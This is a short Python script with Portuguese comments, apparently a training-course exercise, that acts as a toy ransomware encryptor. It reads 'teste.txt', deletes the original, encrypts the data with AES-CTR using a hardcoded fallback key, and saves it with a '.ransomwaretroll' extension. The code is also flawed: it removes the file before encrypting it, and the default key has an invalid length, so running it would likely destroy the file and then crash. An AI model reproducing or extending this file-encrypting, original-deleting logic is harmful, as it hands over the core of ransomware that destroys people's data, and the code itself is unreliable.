import os
import pyaes

# Chave de criptografia segura (recomenda-se usar variáveis de ambiente)
key = os.getenv("ENCRYPTION_KEY", "DesafioDio@1223").encode()

# Nome do arquivo a ser criptografado
file_name = "teste.txt"

# Verifica se o arquivo existe
if not os.path.isfile(file_name):
    print(f"Erro: O arquivo '{file_name}' não foi encontrado.")
    exit()

try:
    # Lê o conteúdo do arquivo
    with open(file_name, "rb") as file:
        file_data = file.read()
    
    # Remove o arquivo original
    os.remove(file_name)
    
    # Criptografa os dados
    aes = pyaes.AESModeOfOperationCTR(key)
    encrypted_data = aes.encrypt(file_data)
    
    # Salva o arquivo criptografado
    encrypted_file_name = f"{file_name}.ransomwaretroll"
    with open(encrypted_file_name, "wb") as encrypted_file:
        encrypted_file.write(encrypted_data)
    
    print(f"Arquivo criptografado salvo como: {encrypted_file_name}")

except Exception as e:
    print(f"Erro ao criptografar o arquivo: {e}")
